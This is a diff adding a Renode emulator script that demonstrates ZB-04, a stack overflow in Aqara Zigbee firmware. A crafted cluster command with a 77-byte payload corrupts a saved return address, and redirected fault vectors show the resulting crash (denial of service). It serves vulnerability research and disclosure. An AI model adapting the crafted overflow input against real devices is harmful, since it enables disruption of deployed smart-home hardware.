@@ -1,0 +1,135 @@
+:name: ZB-04 Aqara n0agl1 — DoS PROOF (corrupted return address -> fault vector taken) [Series 1 / EFR32MG13 / Cortex-M4]
+:description: Extends the natural-dispatch reachability PoC (zb04_dispatch_inject.resc) one decisive step further: instead of stopping after the memmove, it lets sub_5014 reach its OWN epilogue `pop {r4,r5,r6,pc}` @0x5066 with the return address already corrupted by the overflow (0xDEADBEEF -> 0xDEADBEAA), and proves the resulting crash by REDIRECTING the CPU fault vectors (HardFault/MemManage/BusFault/UsageFault @VTOR+0x0C..0x18, VTOR=0x4000) to a RAM trap stub (`b .` @0x2000EE00). The ONLY way PC can reach 0x2000EE00 is via the ARM exception-entry mechanism, so PC==0x2000EE00 after the pop is an unambiguous, non-inferred demonstration that the corrupted return address faults = denial of service.
+#
+# ============================ WHY THIS IS A CLEAN PROOF ============================
+#   The earlier attempt inferred the DoS ("bit0=0 + unmapped -> must fault") and then chased
+#   post-fault PCs (0xe480/0xde1c/0xdea8) that were in fact the firmware's own fault handler --
+#   but that was never confirmed, only guessed. This script removes the guesswork: we overwrite
+#   the fault vectors with a known trap address we control. A fetch of the corrupted PC
+#   (0xDEADBEAA: bit0=0 => UsageFault INVSTATE; address unmapped => BusFault; either escalates to
+#   HardFault) transfers control THROUGH the vector table. PC landing on OUR stub can only happen
+#   via exception entry. No firmware address is hooked; no PC is forced after the sink entry.
+#
+#   Constrained-overflow recap (from zb04_dispatch_inject.resc, reproduced): the 82-byte reception
+#   cap limits the memmove to count=77, which fully overwrites saved R4/R5/R6 and ONLY the LOW BYTE
+#   of the saved return address (0xEF->0xAA). That single controllable byte is enough to make the
+#   return address invalid -> guaranteed fault. It is NOT enough for arbitrary PC control (why ZB-04
+#   is DoS, not RCE).
+# =======================================================================================
+
+using sysbus
+emulation SetGlobalSerialExecution true
+mach create "zb04"
+machine LoadPlatformDescription @platforms/boards/silabs/brd4162a.repl
+macro reset
+"""
+    sysbus LoadELF @scripts/silabs-vuln/zb04_aqara.elf
+    cpu VectorTableOffset 0x4000
+"""
+runMacro $reset
+logLevel 3
+
+# Natural-dispatch chain markers (same as zb04_dispatch_inject.resc).
+cpu AddHook 0xb9dc "self.ErrorLog('MARK_B9DC_ENTRY')"
+cpu AddHook 0x5014 "self.ErrorLog('MARK_5014_SINK_ENTRY')"
+cpu AddHook 0x502a "self.ErrorLog('MARK_502A_MEMMOVE')"
+cpu AddHook 0x5042 "self.ErrorLog('MARK_5042_POST_MEMMOVE')"
+# Epilogue: read the exact value the pop will load into PC (proves the corrupted RA is used).
+cpu AddHook 0x5066 "self.ErrorLog('MARK_5066_EPILOGUE  pop will load PC = [SP+0xC] = 0x{0:X}'.format(self.Bus.ReadDoubleWord(self.GetRegister(13).RawValue + 0xC)))"
+# Trap stub: the ONLY route here is the fault vector. Firing it = DoS proven.
+# The stub is `b .` (self loop), so once PC enters it, it stays there regardless of remaining
+# steps -- no need to force IsHalted (which is not honored mid-Step on this MG13 image).
+cpu AddHook 0x2000EE00 "self.ErrorLog('>>> FAULT VECTOR TAKEN: CPU vectored to trap stub @0x2000EE00 -- corrupted return address crashed the CPU (DoS confirmed)')"
+
+# Boot through clock/power/radio bring-up.
+emulation RunFor "0.3"
+pause
+echo ">>> post-boot PC:"
+cpu PC
+
+# --- Install RAM trap stub: 0xE7FE = `b .` (self loop) at 0x2000EE00 -------------------
+sysbus WriteWord 0x2000EE00 0xE7FE
+# --- Redirect the four programmable fault vectors to the stub (thumb bit set).
+#     NOTE: the ELF's reset vector table is at 0x4000, but the firmware RELOCATES SCB->VTOR to
+#     0x4200 during boot (confirmed via zb04_dos_diag.resc: VTOR=0x4200, HardFault vec@0x420C=
+#     0xE41D). The LIVE table the CPU uses at fault time is therefore 0x4200, so we patch there:
+#     HardFault=+0x0C=0x420C  MemManage=+0x10=0x4210  BusFault=+0x14=0x4214  UsageFault=+0x18=0x4218
+sysbus WriteDoubleWord 0x420C 0x2000EE01
+sysbus WriteDoubleWord 0x4210 0x2000EE01
+sysbus WriteDoubleWord 0x4214 0x2000EE01
+sysbus WriteDoubleWord 0x4218 0x2000EE01
+echo ">>> LIVE fault vectors after redirect (expect 0x2000EE01 each: HardFault/MemManage/BusFault/UsageFault):"
+sysbus ReadDoubleWord 0x420C
+sysbus ReadDoubleWord 0x4210
+sysbus ReadDoubleWord 0x4214
+sysbus ReadDoubleWord 0x4218
+
+# --- FORCED gate/lookup scaffolding (identical to zb04_dispatch_inject.resc) -----------
+sysbus WriteDoubleWord 0x200059f4 0x00000001
+sysbus WriteWord 0x1bff6 0x2001
+sysbus WriteWord 0x1bff8 0x4770
+
+# --- Crafted EmberAfClusterCommand `cmd` @0x2000A000 -----------------------------------
+sysbus WriteDoubleWord 0x2000A000 0x2000A100
+sysbus WriteDoubleWord 0x2000A008 0x2000B000
+sysbus WriteDoubleWord 0x2000A00C 0x00000052
+sysbus WriteDoubleWord 0x2000A010 0x0000115F
+sysbus WriteByte 0x2000A014 0x05
+sysbus WriteByte 0x2000A015 0x00
+sysbus WriteByte 0x2000A00F 0x00
+sysbus WriteDoubleWord 0x2000A100 0xFCC00000
+sysbus WriteByte 0x2000A105 0x01
+
+# --- Source buffer (77 bytes 0xAA from 0x2000B005) -------------------------------------
+sysbus WriteDoubleWord 0x2000B000 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B004 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B008 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B00C 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B010 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B014 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B018 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B01C 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B020 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B024 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B028 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B02C 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B030 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B034 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B038 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B03C 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B040 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B044 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B048 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B04C 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B050 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B054 0xAAAAAAAA
+
+# --- Register contract; LR=0xDEADBEEF so the corrupted saved-LR = 0xDEADBEAA -----------
+sysbus.cpu SetRegister 13 0x2000F000
+sysbus.cpu SetRegister 14 0xDEADBEEF
+sysbus.cpu SetRegister 0  0x2000A000
+sysbus.cpu PC 0xB9DC
+
+# --- STAGE 1: natural dispatch -> sink -> memmove. 346 steps reaches 0x5044 (post-memmove).
+#     (After the memmove sub_5014 enters a slow post-copy completeness loop before its epilogue;
+#      that loop does NOT touch the saved-LR slot, so we confirm the corruption here and then
+#      drive the function's OWN epilogue directly -- the minimal scaffold to observe the return.)
+sysbus.cpu Step 346
+echo ">>> post-memmove PC (expect 0x5044):"
+cpu PC
+echo ">>> saved LR @0x2000EFFC (expect 0xDEADBEAA - corrupted by the natural memmove) ="
+sysbus ReadDoubleWord 0x2000EFFC
+
+# --- STAGE 2: execute sub_5014's REAL epilogue `pop {r4,r5,r6,pc}` @0x5066 on the corrupted
+#     frame. At the pop, SP = 0x2000EFF0 (prologue push{r4,r5,r6,lr}); SP+0xC = 0x2000EFFC =
+#     the corrupted saved-LR slot. Stepping the pop loads PC = 0xDEADBEAA; the next fetch faults
+#     (bit0=0 => UsageFault INVSTATE; unmapped => BusFault) and vectors to our trap stub.
+sysbus.cpu SetRegister 13 0x2000EFF0
+sysbus.cpu PC 0x5066
+echo ">>> at epilogue: pop will load PC = [SP+0xC] = 0x2000EFFC ="
+sysbus ReadDoubleWord 0x2000EFFC
+sysbus.cpu Step 3
+
+echo ">>> FINAL PC (expect 0x2000EE00 = trap stub = fault vector was taken):"
+cpu PC
+quit
